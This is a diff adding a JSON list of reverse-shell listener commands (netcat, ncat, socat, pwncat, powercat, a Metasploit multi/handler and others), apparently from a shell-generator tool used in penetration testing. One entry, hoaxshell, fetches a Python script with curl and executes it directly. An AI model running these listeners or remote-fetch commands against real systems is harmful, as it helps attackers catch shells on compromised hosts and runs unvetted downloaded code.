@@ -1,0 +1,70 @@
+[
+  {
+    "name": "nc",
+    "command": "nc -lvnp {port}"
+  },
+  {
+    "name": "nc freebsd",
+    "command": "nc -lvn {port}"
+  },
+  {
+    "name": "busybox nc",
+    "command": "busybox nc -lp {port}"
+  },
+  {
+    "name": "ncat",
+    "command": "ncat -lvnp {port}"
+  },
+  {
+    "name": "ncat.exe",
+    "command": "ncat.exe -lvnp {port}"
+  },
+  {
+    "name": "ncat (TLS)",
+    "command": "ncat --ssl -lvnp {port}"
+  },
+  {
+    "name": "rlwrap + nc",
+    "command": "rlwrap -cAr nc -lvnp {port}"
+  },
+  {
+    "name": "rustcat",
+    "command": "rcat listen {port}"
+  },
+  {
+    "name": "openssl",
+    "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"
+  },
+  {
+    "name": "pwncat",
+    "command": "python3 -m pwncat -lp {port}"
+  },
+  {
+    "name": "pwncat (windows)",
+    "command": "python3 -m pwncat -m windows -lp {port}"
+  },
+  {
+    "name": "windows ConPty",
+    "command": "stty raw -echo; (stty size; cat) | nc -lvnp {port}"
+  },
+  {
+    "name": "socat",
+    "command": "socat -d -d TCP-LISTEN:{port} STDOUT"
+  },
+  {
+    "name": "socat (TTY)",
+    "command": "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"
+  },
+  {
+    "name": "powercat",
+    "command": "powercat -l -p {port}"
+  },
+  {
+    "name": "msfconsole",
+    "command": "msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\""
+  },
+  {
+    "name": "hoaxshell",
+    "command": "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t {type} -p {port}"
+  }
+]
